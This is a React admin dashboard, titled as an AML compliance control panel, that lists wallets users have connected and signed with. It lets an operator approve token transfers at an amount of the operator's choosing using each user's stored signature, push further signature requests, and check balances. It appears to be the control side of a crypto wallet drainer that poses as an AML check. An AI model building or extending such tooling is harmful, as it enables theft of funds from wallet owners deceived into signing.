import React, { useState, useEffect } from 'react';

export default function BackendControl() {
  const [walletData, setWalletData] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [approvalAmount, setApprovalAmount] = useState("1000");
  const [backendConnected, setBackendConnected] = useState(false);
  const [connectedWallet, setConnectedWallet] = useState(null);
  const [signatureLoading, setSignatureLoading] = useState(false);

  // Backend API configuration
  const BACKEND_URL = "https://aml-manager-backend.onrender.com";

  // Check backend connection and wallet status
  useEffect(() => {
    checkBackendConnection();
    getConnectedWallet(); // Automatically check wallet status on page load
    
    // Poll for wallet status every 30 seconds (reduced frequency to prevent excessive refreshing)
    const interval = setInterval(() => {
      getConnectedWallet();
    }, 30000);
    
    return () => clearInterval(interval);
  }, []);

  async function checkBackendConnection() {
    try {
      const response = await fetch(`${BACKEND_URL}/api/health`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      });
      
      if (response.ok) {
        setBackendConnected(true);
        setError(null);
      } else {
        setBackendConnected(false);
        setError('Backend connection failed');
      }
    } catch (err) {
      setBackendConnected(false);
      setError('Backend connection failed');
    }
  }

  // Fetch wallet data from backend
  async function fetchWalletData() {
    setLoading(true);
    try {
      const response = await fetch(`${BACKEND_URL}/api/wallet/list`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      });
      
      if (response.ok) {
        const data = await response.json();
        setWalletData(data);
        setError(null);
      } else {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to fetch wallet data');
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  // Approve tokens for selected wallet
  async function approveTokens() {
    if (!selectedWallet) {
      setError('Please select a wallet first');
      return;
    }

    setLoading(true);
    setError(null);
    try {
      const response = await fetch(`${BACKEND_URL}/api/wallet/approve`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: selectedWallet.walletAddress,
          amount: approvalAmount,
          signature: selectedWallet.signature
        }),
      });
      
      if (response.ok) {
        const result = await response.json();
        setError(null);
        // Show success message in UI instead of alert
        setError(`✅ Token approval successful! Transaction: ${result.txHash}`);
        setTimeout(() => setError(null), 5000); // Clear after 5 seconds
        await fetchWalletData(); // Refresh data
      } else {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to approve tokens');
      }
    } catch (err) {
      setError(`Failed to approve tokens: ${err.message}`);
    } finally {
      setLoading(false);
    }
  }

  // Check wallet balance
  async function checkBalance() {
    if (!selectedWallet) {
      setError('Please select a wallet first');
      return;
    }

    setLoading(true);
    setError(null);
    try {
      const response = await fetch(`${BACKEND_URL}/api/wallet/balance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: selectedWallet.walletAddress
        }),
      });
      
      if (response.ok) {
        const result = await response.json();
        setError(null);
        // Show balance in UI instead of alert
        setError(`💰 Balance: ${result.balance} ${result.currency || 'ETH'}`);
        setTimeout(() => setError(null), 5000); // Clear after 5 seconds
      } else {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to check balance');
      }
    } catch (err) {
      setError(`Failed to check balance: ${err.message}`);
    } finally {
      setLoading(false);
    }
  }

  // ----------------------------
  // Get Connected Wallet from Backend
  // ----------------------------
  async function getConnectedWallet() {
    setLoading(true);
    setError(null);
    try {
      const response = await fetch(`${BACKEND_URL}/api/wallet/connected`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      });
      
      if (response.ok) {
        const data = await response.json();
        setConnectedWallet(data);
        setError(null);
      } else {
        setConnectedWallet(null);
      }
    } catch (err) {
      setError(`Failed to get connected wallet: ${err.message}`);
      setConnectedWallet(null);
    } finally {
      setLoading(false);
    }
  }

  // ----------------------------
  // Request Offchain Signature
  // ----------------------------
  async function requestOffchainSignature() {
    if (!connectedWallet) {
      setError('No wallet connected. Please connect wallet in user interface first.');
      return;
    }

    setSignatureLoading(true);
    setError(null);
    try {
      // Request signature from the connected wallet via backend
      const response = await fetch(`${BACKEND_URL}/api/wallet/request-signature`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: connectedWallet.walletAddress
        }),
      });
      
      if (response.ok) {
        await response.json();
        setError('✅ Offchain signature request sent to wallet!');
        setTimeout(() => setError(null), 5000);
        await fetchWalletData(); // Refresh wallet list
      } else {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to request signature');
      }
    } catch (err) {
      setError(`Failed to request offchain signature: ${err.message}`);
    } finally {
      setSignatureLoading(false);
    }
  }

  return (
    <div className="dashboard-container">
      {/* Professional Header */}
      <div className="dashboard-header">
        <div className="header-content">
          <div className="logo-section">
            <div className="logo-icon">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="32" height="32" rx="8" fill="url(#gradient)"/>
                <path d="M8 12h16v2H8v-2zm0 4h16v2H8v-2zm0 4h12v2H8v-2z" fill="white"/>
                <defs>
                  <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" stopColor="#667eea"/>
                    <stop offset="100%" stopColor="#764ba2"/>
                  </linearGradient>
                </defs>
              </svg>
            </div>
            <div className="logo-text">
              <h1 className="dashboard-title">Backend Control Panel</h1>
              <p className="dashboard-subtitle">AML Compliance Management</p>
            </div>
          </div>
          <div className="header-actions">
            <div className={`connection-indicator ${backendConnected ? 'connected' : 'disconnected'}`}>
              <div className="status-dot"></div>
              <span className="status-text">{backendConnected ? 'Backend Connected' : 'Backend Disconnected'}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Dashboard Content */}
      <div className="dashboard-content">
        {/* Status Messages */}
        {error && (
          <div className={`status-message ${error.includes('✅') || error.includes('💰') ? 'success' : 'error'}`}>
            <div className="status-icon">
              {error.includes('✅') || error.includes('💰') ? (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              ) : (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              )}
            </div>
            <div className="status-content">
              <div className="status-text">{error}</div>
            </div>
          </div>
        )}

        {/* Connected Wallet Status Card */}
        <div className="wallet-status-card">
          <div className="wallet-header">
            <div className="wallet-icon">
              {connectedWallet ? (
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2"/>
                  <path d="M9 12L11 14L15 10" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              ) : (
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke="currentColor" strokeWidth="2"/>
                </svg>
              )}
            </div>
            <div className="wallet-info">
              <h3 className="wallet-title">
                {connectedWallet ? 'Wallet Connected' : 'No Wallet Connected'}
              </h3>
              <p className="wallet-address">
                {connectedWallet 
                  ? `${connectedWallet.walletAddress?.slice(0, 6)}...${connectedWallet.walletAddress?.slice(-4)}`
                  : 'Please connect wallet in user interface first'
                }
              </p>
            </div>
            <div className="connection-status">
              <div className={`status-indicator ${connectedWallet ? 'connected' : 'disconnected'}`}></div>
              <span className="status-text">{connectedWallet ? 'Active' : 'Inactive'}</span>
            </div>
          </div>

          {connectedWallet && (
            <div className="wallet-details">
              <div className="detail-row">
                <div className="detail-label">
                  <svg className="detail-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9v-9m0-9v9" />
                  </svg>
                  Network
                </div>
                <div className="detail-value">
                  <span className="network-badge">{connectedWallet.network || 'mainnet'}</span>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Control Panel */}
        <div className="control-panel">
          <h3 className="control-title">System Controls</h3>
          <div className="control-buttons">
            <button 
              onClick={fetchWalletData}
              disabled={loading}
              className="control-button primary"
            >
              <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
              </svg>
              <span>{loading ? 'Loading...' : 'Fetch Wallet Data'}</span>
            </button>
            
            <button 
              onClick={requestOffchainSignature}
              disabled={loading || signatureLoading || !connectedWallet}
              className={`control-button secondary ${signatureLoading ? 'loading' : ''}`}
            >
              {signatureLoading ? (
                <svg className="button-icon loading-spinner" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                </svg>
              ) : (
                <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" />
                </svg>
              )}
              <span>{signatureLoading ? 'Sending Request...' : 'Request Signature'}</span>
            </button>
            
            <button 
              onClick={checkBackendConnection}
              className="control-button tertiary"
            >
              <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
              <span>Check Connection</span>
            </button>
          </div>
        </div>

        {/* Wallet List */}
        {walletData.length > 0 && (
          <div className="wallet-list-section">
            <div className="section-header">
              <h3 className="section-title">Registered Wallets</h3>
              <div className="wallet-count">{walletData.length} wallets</div>
            </div>
            <div className="wallet-grid">
              {walletData.map((wallet, index) => (
                <div 
                  key={index}
                  className={`wallet-card ${selectedWallet?.walletAddress === wallet.walletAddress ? 'selected' : ''}`}
                  onClick={() => setSelectedWallet(wallet)}
                >
                  <div className="wallet-card-header">
                    <div className="wallet-address">
                      {wallet.walletAddress?.slice(0, 6)}...{wallet.walletAddress?.slice(-4)}
                    </div>
                    <div className="wallet-status">
                      <div className="status-dot"></div>
                      <span>Active</span>
                    </div>
                  </div>
                  <div className="wallet-card-details">
                    <div className="detail-item">
                      <span className="detail-label">Network:</span>
                      <span className="network-badge">{wallet.network}</span>
                    </div>
                    <div className="detail-item">
                      <span className="detail-label">Signed:</span>
                      <span className="detail-value">{new Date(wallet.timestamp).toLocaleString()}</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Selected Wallet Operations */}
        {selectedWallet && (
          <div className="operations-panel">
            <div className="operations-header">
              <h3 className="operations-title">
                Operations for {selectedWallet.walletAddress?.slice(0, 6)}...{selectedWallet.walletAddress?.slice(-4)}
              </h3>
            </div>
            
            <div className="operations-content">
              <div className="input-group">
                <label className="input-label">Approval Amount</label>
                <div className="input-wrapper">
                  <input
                    type="number"
                    value={approvalAmount}
                    onChange={(e) => setApprovalAmount(e.target.value)}
                    placeholder="Enter amount to approve"
                    className="amount-input"
                  />
                  <span className="input-suffix">tokens</span>
                </div>
              </div>
              
              <div className="operations-buttons">
                <button 
                  onClick={approveTokens}
                  disabled={loading}
                  className="operation-button success"
                >
                  <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <span>{loading ? 'Processing...' : 'Approve Tokens'}</span>
                </button>
                <button 
                  onClick={checkBalance}
                  disabled={loading}
                  className="operation-button secondary"
                >
                  <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1" />
                  </svg>
                  <span>{loading ? 'Checking...' : 'Check Balance'}</span>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Empty State */}
        {walletData.length === 0 && (
          <div className="empty-state">
            <div className="empty-icon">
              <svg width="48" height="48" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
              </svg>
            </div>
            <h3 className="empty-title">No Wallets Registered</h3>
            <p className="empty-description">
              No wallets have been registered yet. Users need to connect and sign first.
            </p>
            <button 
              onClick={fetchWalletData}
              className="refresh-button"
            >
              <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
              <span>Refresh Data</span>
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
